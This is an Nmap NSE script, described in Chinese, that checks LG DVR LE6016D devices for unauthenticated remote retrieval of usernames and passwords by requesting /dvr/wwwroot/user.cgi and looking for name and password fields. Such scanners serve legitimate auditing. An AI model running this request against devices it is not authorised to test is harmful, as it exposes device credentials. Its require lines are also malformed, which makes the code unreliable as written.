local http require "http"
local string require "string"
local stdnse require "stdnse"
local shortport require "shortport"


description = [[
. LG DVR LE6016D
未认证远程获取用户/密码
]]

portrule = shortport.http


action = function(host, port)
    local uri = "/dvr/wwwroot/user.cgi"
    local output = stdnse.output_table()
    local response = http.get(host, port, uri)

    if response.status == 200 then
        if string.find(response.body, "<name>") ~= nil and string.find(response.body, "<pw>") ~= nil then
            output = "[+] Found vulnerable."
        else
            output = "[-] Not Found vulnerable."
        end
    end
    return output
end

